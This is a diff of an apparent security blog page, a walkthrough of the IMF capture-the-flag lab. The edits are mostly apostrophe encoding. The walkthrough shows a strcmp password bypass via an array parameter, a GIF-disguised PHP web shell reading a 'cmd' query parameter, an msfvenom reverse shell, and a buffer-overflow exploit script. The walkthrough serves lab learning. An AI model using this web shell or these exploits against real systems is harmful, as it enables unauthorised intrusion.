@@ -17,8 +17,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="[audible]blink ">
 <meta name="description" content="After mapping the network and finding our IP address at 192.168.1.162, we can add it to our /etc/hosts temporarily to make things a little easier for us.
-echo &amp;quot;192.168.1.162 imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts Lets see what kind of machine we&#39;re dealing with.
-Ok, so web only. Great. nikto didn&#39;t reveal any low-hanging fruit so let&#39;s dive into the source.
+echo &amp;quot;192.168.1.162 imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts Lets see what kind of machine we&amp;rsquo;re dealing with.
+Ok, so web only. Great. nikto didn&amp;rsquo;t reveal any low-hanging fruit so let&amp;rsquo;s dive into the source.
 Check that out! Our first flag was hidden in http://imf/contact.php. This looks like base64." />
 <meta name="keywords" content="hacking, blog, science, infosec, development, programming" />
 <meta name="robots" content="noodp" />
@@ -91,7 +91,7 @@ Check that out! Our first flag was hidden in http://imf/contact.php. This looks 
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/post/">Posts</a></li>
     </ul>
 </nav>
 
@@ -137,13 +137,13 @@ Check that out! Our first flag was hidden in http://imf/contact.php. This looks 
                 <p>After mapping the network and finding our IP address at <code>192.168.1.162</code>, we can add it to our <code>/etc/hosts</code>
 temporarily to make things a little easier for us.</p>
 <pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.162     imf&quot; &gt;&gt; /etc/hosts
-</code></pre><p>Lets see what kind of machine we're dealing with.</p>
+</code></pre><p>Lets see what kind of machine we&rsquo;re dealing with.</p>
 <p><img src="https://i.imgur.com/1DmhXnq.png" alt=""></p>
-<p>Ok, so web only. Great. <code>nikto</code> didn't reveal any low-hanging fruit so let's dive into the source.</p>
+<p>Ok, so web only. Great. <code>nikto</code> didn&rsquo;t reveal any low-hanging fruit so let&rsquo;s dive into the source.</p>
 <p><img src="https://i.imgur.com/S4hPuB2.png" alt=""></p>
 <p>Check that out! Our first flag was hidden in <code>http://imf/contact.php</code>. This looks like base64. After decoding
 we get the clue <code>allthefiles</code>. Lets keep looking.</p>
-<p>Going back to the source code, I found a javascript file that also looked like it was base64 but it didn't
+<p>Going back to the source code, I found a javascript file that also looked like it was base64 but it didn&rsquo;t
 return any results. After a while of going in circles I took my dog for a walk and pondered about what
 &lsquo;allthefiles&rsquo; could mean. When I came back and looked over the source code again, I saw this:</p>
 <p><img src="https://i.imgur.com/ANZ1UgC.png" alt=""></p>
@@ -151,17 +151,17 @@ return any results. After a while of going in circles I took my dog for a walk a
 <p><img src="https://i.imgur.com/Ik1rUga.png" alt=""></p>
 <p>If we visit that directory on our webapp</p>
 <p><img src="https://i.imgur.com/75xqVVJ.png" alt=""></p>
-<p>Ok, no DB here. We're dealing with a hardcoded password which means we're dealing with an equaltiy operator
+<p>Ok, no DB here. We&rsquo;re dealing with a hardcoded password which means we&rsquo;re dealing with an equaltiy operator
 on the backend or possibly the <code>strcmp()</code> function. I messed around with nullbyte string termination exploits
-here for a while but ultimately ended up nowhere. Let's assume we're dealing with <code>strcmp</code> since it's easier
+here for a while but ultimately ended up nowhere. Let&rsquo;s assume we&rsquo;re dealing with <code>strcmp</code> since it&rsquo;s easier
 to fool a function than to fool an operator.</p>
 <p><img src="https://i.imgur.com/qo8t92C.png" alt=""></p>
-<p>I'm not very good with PHP, but I'm guessing that I need this function to return a <code>0</code> so I fired up
+<p>I&rsquo;m not very good with PHP, but I&rsquo;m guessing that I need this function to return a <code>0</code> so I fired up
 <a href="https://repl.it">repl.it</a> and started trying to break it. Turns out if you feed it the wrong type (it
 expects two strings), it seems to return a <code>0</code>.</p>
 <p><img src="https://i.imgur.com/iQiFPrC.png" alt=""></p>
 <p>So if we can feed this function an array from the web form, we might be able to bypass the password check. By
-changing the name of the form's password field from <code>pass</code> to <code>pass[]</code>, we can do just that.</p>
+changing the name of the form&rsquo;s password field from <code>pass</code> to <code>pass[]</code>, we can do just that.</p>
 <p><img src="https://i.imgur.com/DpxX4o7.png" alt=""></p>
 <p>With the modified form, a BS password, and a username from the Contacts page, we get&hellip;</p>
 <p><img src="https://i.imgur.com/wB0UUP3.png" alt=""></p>
@@ -184,24 +184,24 @@ when I saw this:</p>
 ❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
 uploadr942.php   
 </code></pre><p>We navigate to <code>http://imf/imfadministrator/uploadr942.php</code> and we get our uploader. After messing around
-with it a bit we can see that the response html from a successful upload has a hash of some sort. I'm
+with it a bit we can see that the response html from a successful upload has a hash of some sort. I&rsquo;m
 guessing its the hashed version of the filename in the <code>/uploads</code> folder.</p>
 <p>Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
 db so it gets executed.</p>
 <p><img src="https://i.imgur.com/y8obNV4.png" alt=""></p>
-<p>Let's upload it!</p>
+<p>Let&rsquo;s upload it!</p>
 <p><img src="https://i.imgur.com/ePzjKU9.png" alt=""></p>
 <p>Haha! Whoops. Alright what about just regular command execution:</p>
 <pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">cat &lt;&lt;EOF &gt; muahaha.gif
 GIF89a
 &lt;?php \`id\` ?&gt;
 </code></pre><p>Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
-parameter. Let's replace <code>id</code> with <code>$cmd=$_GET['cmd']; echo $cmd</code> and try again.</p>
+parameter. Let&rsquo;s replace <code>id</code> with <code>$cmd=$_GET['cmd']; echo $cmd</code> and try again.</p>
 <p><img src="https://i.imgur.com/v0uaGPw.png" alt=""></p>
-<p>Lets get a shell that's easier to work with with <code>msfvenom</code>.</p>
+<p>Lets get a shell that&rsquo;s easier to work with with <code>msfvenom</code>.</p>
 <p><img src="https://i.imgur.com/lXrjIik.png" alt="">
 <img src="https://i.imgur.com/dRelPbw.png" alt=""></p>
-<p>It's time to get a sense of the machine we're in. &ldquo;Presence&rdquo;</p>
+<p>It&rsquo;s time to get a sense of the machine we&rsquo;re in. &ldquo;Presence&rdquo;</p>
 <ul>
 <li>interesting processes - knockd, sshd</li>
 <li>interesting files (world readable, executable root files, etc) - <code>/usr/local/bin</code>
@@ -212,16 +212,16 @@ parameter. Let's replace <code>id</code> with <code>$cmd=$_GET['cmd']; echo $cmd
 </li>
 <li>listening ports <code>netstat -plnt</code> - 7788</li>
 </ul>
-<p>It looks like we've got a hidden service running on 7788. To enable it, we have to &lsquo;knock&rsquo; in the right order
+<p>It looks like we&rsquo;ve got a hidden service running on 7788. To enable it, we have to &lsquo;knock&rsquo; in the right order
 so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.</p>
 <p><img src="https://i.imgur.com/SgDQYRk.png" alt="">
 <img src="https://i.imgur.com/SdM3380.png" alt=""></p>
 <p>Lets decompile our downloaded binary at <a href="https://retdec.com/decompilation-run/">https://retdec.com/decompilation-run/</a></p>
 <p><img src="https://i.imgur.com/WnuLN8R.png" alt=""></p>
-<p>We can see on line 49 where the authentication happens. It's comparing against a string that was defined on
+<p>We can see on line 49 where the authentication happens. It&rsquo;s comparing against a string that was defined on
 line 37, <code>0x2ddd984</code>. If we pop this into an online hex converter, we get <code>48093572</code></p>
 <p><img src="https://i.imgur.com/rs6S3Yf.png" alt=""></p>
-<p>After navigating through our binary, we have a place where we have user input. This is looking like it's
+<p>After navigating through our binary, we have a place where we have user input. This is looking like it&rsquo;s
 going to be a buffer overflow exploit. Once we download our application and run it through <code>gdb</code>, we confirm
 that the report function is vulnerable.</p>
 <p><img src="https://i.imgur.com/4CxBLoX.png" alt="">
@@ -229,8 +229,8 @@ that the report function is vulnerable.</p>
 <p>Bingo. Plug 0x41366641 into <code>pattern_offset</code> we see that our buffer ends at 168, meaning our EIP register is
 at 169. If we inspect the assembly for the <code>report</code> function, we see that our report string is stored in EAX.
 Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
-other. We can place our exploit at the beginning of EAX by simply injecting it as the &ldquo;report&rdquo;. We'll then
-pad the input string until it's 168 characters long. Then, well tell EIP that it should return to the
+other. We can place our exploit at the beginning of EAX by simply injecting it as the &ldquo;report&rdquo;. We&rsquo;ll then
+pad the input string until it&rsquo;s 168 characters long. Then, well tell EIP that it should return to the
 beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
 address in EIP.</p>
 <p><img src="https://i.imgur.com/R7BFi8b.png" alt="">
@@ -270,7 +270,7 @@ s.write(&quot;3\n&quot;)
 
 puts s.readpartial(512)
 s.write(exploit + &quot;\n&quot;)
-</code></pre><p>Let's run it!</p>
+</code></pre><p>Let&rsquo;s run it!</p>
 <p><img src="https://i.imgur.com/ImmvfQj.png" alt=""></p>
 <p>And there we have it! Thanks for reading!</p>
 
